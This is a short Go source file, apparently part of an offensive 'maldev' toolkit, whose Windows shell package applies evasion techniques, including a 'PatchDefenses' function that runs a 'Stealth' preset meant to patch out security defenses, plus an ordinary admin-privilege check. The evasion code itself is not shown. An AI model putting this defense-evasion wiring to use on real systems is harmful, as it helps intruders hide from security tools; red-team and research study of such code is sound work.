//go:build windows

package shell

import (
	"fmt"
	"strings"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
)

// applyEvasion applies the provided evasion techniques on Windows.
// Returns an aggregate error listing all failed techniques, or nil.
func applyEvasion(techniques []evasion.Technique, caller evasion.Caller) error {
	if len(techniques) == 0 {
		return nil
	}
	errs := evasion.ApplyAll(techniques, caller)
	if len(errs) == 0 {
		return nil
	}
	parts := make([]string, 0, len(errs))
	for name, err := range errs {
		parts = append(parts, fmt.Sprintf("%s: %v", name, err))
	}
	return fmt.Errorf("evasion failures: %s", strings.Join(parts, "; "))
}

// PatchDefenses applies all available evasion patches.
func PatchDefenses() error {
	errs := evasion.ApplyAll(preset.Stealth(), nil)
	if len(errs) > 0 {
		return fmt.Errorf("evasion: %v", errs)
	}
	return nil
}

// IsAdmin checks if the current process has admin privileges.
func IsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	var token windows.Token
	proc, _ := windows.GetCurrentProcess()
	if err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token); err != nil {
		return false
	}
	defer token.Close()

	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}

	return member
}
